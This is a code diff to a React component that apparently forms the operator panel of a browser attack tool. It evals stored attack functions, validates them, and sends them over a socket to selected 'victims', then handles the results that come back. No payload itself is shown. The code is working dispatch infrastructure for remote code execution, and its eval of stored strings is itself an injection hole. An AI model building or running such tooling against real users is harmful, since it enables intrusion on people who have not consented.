@@ -3,6 +3,10 @@ import {connect} from 'react-redux'
 import {bindActionCreators} from 'redux'
 import * as attackActions from '../../actions/attacks'
 import * as utils from '../../utils'
+import './Attacks.css'
+import Attack from './Attack'
+import AttackBuilder from './AttackBuilder'
+
 
 class Attacks extends Component {
   componentDidMount() {
@@ -21,43 +25,59 @@ class Attacks extends Component {
   }
 
   _executeAttack = (attack)=>{
-    let attackConstructor
-    eval(`attackConstructor = ${attack.constructor}`)
-    if(!this._isValidExecutionConstructor(attackConstructor)){
-      this.props.logger(`Attack "${attack.name}" failed execution instruction validation.`)
-      return
-    }
+    try{
+      let activeTargetSocketIds = utils.objToArrayOfValues(this.props.activeTargets, 'socketId')
+      if(activeTargetSocketIds.length === 0){
+        this.props.logger(`No active targets. Select a target.`)
+        return
+      }
+      this.props.logger(`Targeting ${activeTargetSocketIds.length} victim${activeTargetSocketIds.length > 1 ? 's' : ''}...`)
 
-    let activeTargetSocketIds = utils.objToArrayOfValues(this.props.activeTargets, 'socketId')
-    if(activeTargetSocketIds.length === 0){
-      this.props.logger(`No active targets. Select a target.`)
-      return
-    }
 
-    let instructions = attackConstructor(utils.getObjValues(attack.inputs), this.props.logger)
-    activeTargetSocketIds.forEach((socketId)=>{
-      this.props.logger(`Executing attack "${attack.name}" on ${this.props.victimsBySocketIdMap[socketId].id}...`)
-      let attackInstanceId = `${socketId}_${new Date().valueOf()}`
-      this._followupBuffer[attackInstanceId] = instructions.followup.bind(null, instructions.inputs)
-      this._socket.emit('attackUser', {
-        userSocket: socketId,
-        attack: instructions.attack.toString(),
-        inputs: Object.assign({}, instructions.inputs, {id: attackInstanceId})
+      let attackPrep, attackExecute, attackFollowup
+      eval(`attackPrep = ${attack.prepare}; attackExecute = ${attack.execute}; attackFollowup = ${attack.followup};`)
+      if(!this._isValidAttackFunction(attackPrep, 'prep') || !this._isValidAttackFunction(attackExecute, 'execute') || !this._isValidAttackFunction(attackFollowup, 'followup')){
+        this.props.logger(`Attack "${attack.name}" failed execution instruction validation.`)
+        return
+      }
+      this.props.logger('Attack instructions are valid...')
+
+
+      let params = attackPrep(utils.getObjValues(attack.inputs), this.props.logger)
+      activeTargetSocketIds.forEach((socketId)=>{
+        this.props.logger(`Executing attack "${attack.name}" on ${this.props.victimsBySocketIdMap[socketId].id}...`)
+        let attackInstanceId = `${socketId}_${new Date().valueOf()}`
+        this._followupBuffer[attackInstanceId] = attackFollowup
+        this._socket.emit('attackUser', {
+          userSocket: socketId,
+          attack: attackExecute.toString(),
+          params: Object.assign({}, params, {id: attackInstanceId})
+        })
       })
-    })
+    }catch(e){
+      this.props.logger('Error executing attack.')
+      this.props.logger(e)
+    }
   }
 
-  _isValidExecutionConstructor = (execute)=>{
-    if(typeof execute !== 'function'){
-      this.props.logger(`attack instructions are not a function`)
+  _isValidAttackFunction = (attackFunction, type)=>{
+    if(typeof attackFunction !== 'function'){
+      this.props.logger(`attack ${type} function is not a valid function`)
+      return false
+    }
+    let attackFunctionString = attackFunction.toString()
+    if(!~attackFunctionString.replace(/ /g,'').indexOf('function(params')){
+      this.props.logger(`attack ${type} function is missing parameter 'params'`)
       return false
     }
     return true
   }
 
   _resultReceived = (result)=>{
-    this.props.logger(`Result received from victim ${this.props.victimsBySocketIdMap[result.id.slice(0, result.id.lastIndexOf('_'))].id}`)
-    this._followupBuffer[result.id]()
+    let resultId = result.params.id
+    this.props.logger(`Result received from victim ${this.props.victimsBySocketIdMap[resultId.slice(0, resultId.lastIndexOf('_'))].id}`)
+    this.props.logger(`${result.message}`)
+    this._followupBuffer[resultId](result.params, this.props.logger)
   }
 
   render(){
@@ -71,44 +91,30 @@ class Attacks extends Component {
           </tr>
           <tr>
             <th>Name</th>
-            <th className='twelve wide'>Description</th>
+            <th className='ten wide'>Description</th>
           </tr>
         </thead>
-        <tbody>
-          {
-            this.props.attacks.map((attack, idx) => (
-              [
-                <tr
-                  key={`attack_${idx}`}
-                  onClick={() => {this.props.actions.toggleActiveAttack(attack)}}
-                  className={this.props.activeAttack.id === attack.id ? 'title active' : 'title'}
-                >
-                  <td>{attack.name}</td>
-                  <td>{attack.description}</td>
-                </tr>,
-                Object.keys(attack.inputs).map((inputName, indx)=>(
-                  <tr
-                    key={`attack_${idx}_input_${indx}`}
-                    className={this.props.activeAttack.id === attack.id ? 'content active' : 'content'}
-                    //semantic ui forces this row into the first cell without this
-                    style={{display: this.props.activeAttack.id === attack.id ? 'table-row' : 'none'}}
-                  >
-                    <td><label>{inputName}: </label><input onChange={(event)=>{this.props.actions.updateActiveAttackInput(inputName, event.target.value)}} defaultValue={attack.inputs[inputName].defaultValue}/></td>
-                    <td><span>{attack.inputs[inputName].description}</span></td>
-                  </tr>
-                )),
-                <tr
-                  key={`attack_${idx}_execute`}
-                  className={this.props.activeAttack.id === attack.id ? 'content active' : 'content'}
-                  //semantic ui forces this row into the first cell without this
-                  style={{display: this.props.activeAttack.id === attack.id ? 'table-row' : 'none'}}
-                >
-                  <td colSpan="2"><button onClick={()=>{this._executeAttack(attack)}}>Execute</button></td>
-                </tr>
-              ]
-            ))
-          }
-        </tbody>
+        {
+          this.props.attacks.map((attack, idx) => (
+            <Attack 
+              attack={attack}
+              key={`attack_${idx}`}
+              index={idx}
+              active={this.props.activeAttack.id === attack.id}
+              toggleActive={this.props.actions.toggleActiveAttack}
+              updateInput={this.props.actions.updateActiveAttackInput}
+              execute={this._executeAttack}
+            />
+          ))
+        }
+        <AttackBuilder 
+          key={`attack_builder`}
+          active={this.props.activeAttack.id === 'builder'}
+          logger={this.props.logger}
+          toggleActive={this.props.actions.toggleActiveAttack}
+          updateInput={this.props.actions.updateActiveAttackInput}
+          execute={this._executeAttack}
+        />
       </table>
     )
   }
